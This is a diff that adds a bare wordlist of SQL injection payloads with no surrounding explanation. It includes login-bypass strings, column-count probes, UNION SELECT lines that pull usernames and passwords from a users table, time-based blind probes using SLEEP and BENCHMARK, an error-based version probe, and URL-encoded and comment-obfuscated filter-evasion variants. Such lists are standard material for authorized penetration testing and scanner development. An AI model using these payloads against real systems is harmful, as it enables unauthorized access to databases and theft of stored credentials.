@@ -1,0 +1,54 @@
+' OR '1'='1 --
+" OR "1"="1 --
+' OR 1=1 --
+" OR 1=1 --
+') OR ('1'='1 --
+") OR ("1"="1 --
+' OR 'a'='a --
+" OR "a"="a --
+' AND 1=1 --
+" AND 1=1 --
+' AND 1=2 --
+" AND 1=2 --
+1' ORDER BY 1 --
+1' ORDER BY 2 --
+1' ORDER BY 3 --
+1' ORDER BY 4 --
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT 1,2,3 --
+' UNION SELECT username,password FROM users --
+' UNION ALL SELECT 1,2,3 --
+admin' --
+admin' #
+admin'/*
+' OR ''='
+" OR ""="
+' OR '' = '' --
+" OR "" = "" --
+' OR 2>1 --
+" OR 2>1 --
+' OR 2<3 --
+" OR 2<3 --
+' OR 2=2 --
+" OR 2=2 --
+' or 'one'='one
+" or "one"="one
+') OR ('one'='one
+") OR ("one"="one
+' AND 1=CONVERT(int, @@version) --
+' AND SLEEP(5) --
+' OR IF(1=1,SLEEP(5),0) --
+' OR BENCHMARK(1000000,MD5(1)) --
+%27%20OR%20%271%27%3D%271%27--
+%22%20OR%20%221%22%3D%221%22--
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+'/**/OR/**/'1'='1
+"/*!50000OR*/"1"="1
+' OR '1'='1'-- -
+" OR "1"="1"-- -
+' OR 1=1# 
+" OR 1=1#
+1 OR 1=1
